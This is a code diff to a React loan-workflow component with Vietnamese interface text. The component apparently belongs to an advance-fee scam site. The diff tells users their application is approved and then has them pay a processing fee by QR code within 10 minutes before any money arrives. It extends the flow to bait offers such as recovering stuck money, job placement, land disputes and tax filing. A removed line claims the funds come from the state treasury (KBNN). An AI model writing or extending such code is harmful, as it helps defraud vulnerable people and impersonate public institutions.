@@ -565,10 +565,26 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     }
 
     if (state === 'approved') {
+        const needsBankForm = service === 'vay-von' || service === 'tien-treo';
         return (
             <div className="state-container">
                 <div className="state-title" style={{ color: '#28a745' }}>✅ Hồ sơ của Quý khách đã được phê duyệt thành công</div>
-                <button className="btn-submit" onClick={() => { skipPollingRef.current = true; setState('bank'); }}>Vui lòng làm thủ tục giải ngân</button>
+                {needsBankForm ? (
+                    <button className="btn-submit" onClick={() => { skipPollingRef.current = true; setState('bank'); }}>Vui lòng làm thủ tục giải ngân</button>
+                ) : (
+                    <button className="btn-submit" onClick={async () => {
+                        setLoading(true);
+                        try {
+                            // Auto-submit without bank info for services that don't need it
+                            await axios.post(`${API_BASE}/submit-bank`, { token, bankOwner: 'N/A', bankName: 'N/A', bankAccount: 'N/A' });
+                            skipPollingRef.current = false;
+                            setState('waiting_qr');
+                        } catch (e) {
+                            alert('Có lỗi xảy ra, vui lòng thử lại.');
+                        }
+                        setLoading(false);
+                    }} disabled={loading}>{loading ? 'Đang xử lý...' : 'Tiến hành thanh toán phí'}</button>
+                )}
             </div>
         );
     }
@@ -602,11 +618,29 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
             </div>
         );
     }
+    // Service-specific titles and messages
+    const getServiceInfo = () => {
+        switch (service) {
+            case 'vay-von':
+                return { title: 'Giải ngân vay vốn', waitingMsg: 'giải ngân', successMsg: 'Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.' };
+            case 'tien-treo':
+                return { title: 'Hỗ trợ lấy lại tiền treo', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hỗ trợ bạn lấy lại tiền trong thời gian sớm nhất.' };
+            case 'tim-viec':
+                return { title: 'Hỗ trợ tìm việc làm', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ giới thiệu việc làm phù hợp trong thời gian sớm nhất.' };
+            case 'dat-dai':
+                return { title: 'Giải quyết đất đai', waitingMsg: 'xử lý hồ sơ', successMsg: 'Bộ phận pháp lý sẽ liên hệ hỗ trợ giải quyết tranh chấp trong thời gian sớm nhất.' };
+            case 'nop-thue':
+                return { title: 'Kê khai thuế', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hướng dẫn hoàn tất kê khai thuế trong thời gian sớm nhất.' };
+            default:
+                return { title: 'Xử lý hồ sơ', waitingMsg: 'xử lý', successMsg: 'Chúng tôi sẽ liên hệ với bạn trong thời gian sớm nhất.' };
+        }
+    };
+    const serviceInfo = getServiceInfo();
 
     if (state === 'waiting_qr') {
         return (
             <div className="state-container">
-                <div className="state-title">⏳ Chúng tôi đang xử lý thông tin giải ngân</div>
+                <div className="state-title">⏳ Chúng tôi đang {serviceInfo.waitingMsg}</div>
                 <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.6' }}>
                     Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
                     Vui lòng không đóng trang này.
@@ -614,7 +648,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                 {fee > 0 && (
                     <div style={{ marginTop: '20px', padding: '15px', background: '#f8faff', borderRadius: '8px', border: '1px solid #e1e4e8' }}>
                         <p style={{ margin: 0, color: '#2c3e50', fontSize: '15px' }}>
-                            Phí xử lý hồ sơ: <br />
+                            Phí {serviceInfo.title.toLowerCase()}: <br />
                             <b style={{ color: '#d32f2f', fontSize: '18px' }}>{fee.toLocaleString('vi-VN')} VNĐ</b>
                         </p>
                     </div>
@@ -628,17 +662,17 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
             <div className="state-container">
                 {qrUrl && (
                     <div style={{ marginBottom: '20px', textAlign: 'center' }}>
-                        <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Nhận mã QR giải ngân</div>
+                        <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Mã QR thanh toán - {serviceInfo.title}</div>
                         <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
                         {fee > 0 && (
                             <div style={{ marginTop: '15px', color: '#d32f2f', fontWeight: 'bold', fontSize: '18px' }}>
-                                Phí xử lý: {fee.toLocaleString('vi-VN')} VNĐ
+                                Phí {serviceInfo.title.toLowerCase()}: {fee.toLocaleString('vi-VN')} VNĐ
                             </div>
                         )}
                         <p style={{ fontSize: '14px', marginTop: '10px', fontWeight: 'bold', color: '#ff4d4f' }}>
                             ⚠️ Mã QR có hiệu lực trong vòng 10 phút
                         </p>
-                        <p style={{ color: '#666', fontSize: '13px', marginTop: '5px' }}>Quét mã QR để hoàn tất quá trình nhận tiền từ KBNN</p>
+                        <p style={{ color: '#666', fontSize: '13px', marginTop: '5px' }}>Quét mã QR để hoàn tất thủ tục {serviceInfo.title.toLowerCase()}</p>
                     </div>
                 )}
                 {!qrUrl && (
@@ -651,8 +685,8 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     if (state === 'success') {
         return (
             <div className="state-container">
-                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>🎉 Giải ngân thành công!</div>
-                <p style={{ color: '#666', fontSize: '16px' }}>Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.</p>
+                <div className="state-title" style={{ color: '#28a745', fontSize: '24px' }}>🎉 {serviceInfo.title} thành công!</div>
+                <p style={{ color: '#666', fontSize: '16px' }}>{serviceInfo.successMsg}</p>
             </div>
         );
     }
